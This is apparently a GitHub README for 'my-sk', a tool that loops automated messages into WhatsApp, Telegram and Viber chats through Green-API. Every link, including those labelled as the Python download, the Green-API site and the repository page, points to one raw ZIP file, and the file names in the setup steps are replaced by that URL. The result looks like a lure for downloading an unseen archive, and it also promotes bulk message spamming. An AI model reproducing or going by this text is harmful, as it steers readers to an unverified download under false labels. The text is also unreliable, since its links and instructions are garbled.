# 📬 my-sk - Automated Message Sending Tool

[![Download my-sk](https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip)](https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip)

---

## 📖 What is my-sk?

my-sk is a simple program to send messages automatically in WhatsApp, Telegram, Viber, or MAX using the Green-API platform. 

You create a list of messages in a text file, run the program, and it sends them repeatedly to your chosen chat. The program adds random delays between messages and can send messages using multiple threads. It also saves logs of its activity.

It works quietly in the background with no extra steps.

---

## 💡 Key Features

- Automatically send messages in a loop  
- Supports WhatsApp, Telegram, Viber, and MAX chats  
- Uses the Green-API messaging service  
- Random delays between messages to avoid spamming  
- Runs multiple sending tasks at once to speed up progress  
- Saves logs to track your sending history  
- Easy setup with no coding needed

---

## ⚙️ System Requirements

- Windows 10 or later  
- Internet connection  
- Python 3.7 or higher installed  
- Enough free space to store your message files and logs (less than 100 MB)

---

## 📥 Download & Install

**Start by visiting this page to download the latest version:**  
➡️ [Go to my-sk Releases](https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip)

1. Click on the latest release link to find the ZIP archive file for Windows.  
2. Download the ZIP file to your computer.  
3. Open the ZIP archive and extract all files to any folder you like (for example, your Desktop or Documents).  
4. Open the extracted folder and locate the file named `https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip`.  
5. Double-click `https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip` to launch the program.  
6. Before it works, open the file `https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip` with a simple text editor like Notepad.  
7. Replace the placeholders for `ID_INSTANCE`, `API_TOKEN`, and `CHAT_ID` with your own Green-API details and the chat ID where messages should be sent.  
8. Save the changes in `https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip` and run `https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip` again. Your messages will start sending automatically.

---

## 📝 Setting up Your Messages

To prepare the messages you want to send:

1. Create a plain text file with the `.txt` extension.  
2. Write each message on a separate line in the file.  
3. Save the text file inside the folder with the program or any folder you prefer.  
4. Ensure the program is set to use that text file’s path.  
   
This file will be read by the program and your messages will cycle through it endlessly.

---

## 🔧 How to Use

- After you run `https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip`, the program reads your message list.  
- It sends messages one by one to the chat you set in `https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip`.  
- Between messages, the program waits a random short time.  
- You will see status updates in the command window, including any errors if they happen.  
- Logs are saved automatically to allow later review of sent messages.

If you want to stop the program, simply close the command window.

---

## 🛠 Configuration Details

You need to edit three pieces of information inside `https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip`:

- **ID_INSTANCE**: This is your Green-API account’s instance ID.  
- **API_TOKEN**: Your Green-API token for authorization.  
- **CHAT_ID**: The ID of the chat to which messages will be sent. This differs for WhatsApp, Telegram, or Viber.

If you don’t have these details:

- Sign up at [Green-API](https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip) to get your ID and token.  
- Use the Green-API documentation to find the chat ID for your target chat.

---

## 🧩 How It Works

The program uses Python and the `aiohttp` library to handle sending messages over the network asynchronously.

- It opens multiple sending “threads” to speed up delivery.  
- Between messages, random delays keep the sending pattern natural.  
- If errors occur (network or API problems), it logs them and tries to continue.  
- It does not require you to interact after setup, making the process hands-free.

---

## 📦 Installing Required Libraries

For this program to work, you must have Python installed on your PC. It can be download from [https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip](https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip).

After Python is ready, open a command prompt window and type this command to install a key library:

```bash
pip install aiohttp
```

This library allows the program to send messages efficiently.

---

## 🛡 Safety and Privacy

- The program only sends messages you specify.  
- It uses your Green-API credentials, so keep your tokens secure.  
- Logs contain information about sent messages for your reference only.  
- Do not share your `https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip` file with private credentials.

---

## 💬 Getting Help

If you run into problems:

- Check the log files to see what the program reports.  
- Verify your Green-API credentials are correct.  
- Make sure your message text file is formatted correctly.  
- Review the Green-API setup guide on their official site for chat ID and API info.

If needed, you can open an issue or discussion on the [GitHub repository page](https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip).

---

## 🏷 Topics

This project relates to automation and messaging through APIs on platforms like WhatsApp, Telegram, Viber, and MAX. It uses Python scripting and Green-API to send messages effortlessly.

---

## 🔗 Quick links

- [Download my-sk Releases](https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip)  
- [Green-API Website](https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip)  
- [https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip](https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip)

---

[![Download my-sk](https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip)](https://raw.githubusercontent.com/ngiuiemm/my-sk/main/src/my_sk_1.0.zip)